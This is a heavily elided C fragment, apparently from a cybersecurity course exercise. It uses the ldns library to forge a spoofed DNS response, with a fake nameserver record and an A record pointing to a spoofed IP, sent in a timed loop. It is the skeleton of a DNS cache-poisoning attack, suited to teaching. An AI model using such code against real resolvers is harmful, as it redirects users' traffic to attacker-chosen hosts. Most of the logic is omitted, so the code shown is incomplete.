...
ldns_pkt *create_spoofed_response(const char *target_domain, const char *spoofed_ip, uint16_t txid) {
    ...
    owner = ldns_rdf_new_frm_str(LDNS_RDF_TYPE_DNAME, "www.example.cybercourse.com.");
    ...
    ns_name = ldns_rdf_new_frm_str(LDNS_RDF_TYPE_DNAME, "ns.cybercourse.com.");
    ...
    owner = ldns_rdf_new_frm_str(LDNS_RDF_TYPE_DNAME, "ns.cybercourse.com.");
    address = ldns_rdf_new_frm_str(LDNS_RDF_TYPE_A, SPOOFED_IP);
...
int main() {
    ...
    usleep(100000); // Sleep for 0.1 seconds to avoid flooding
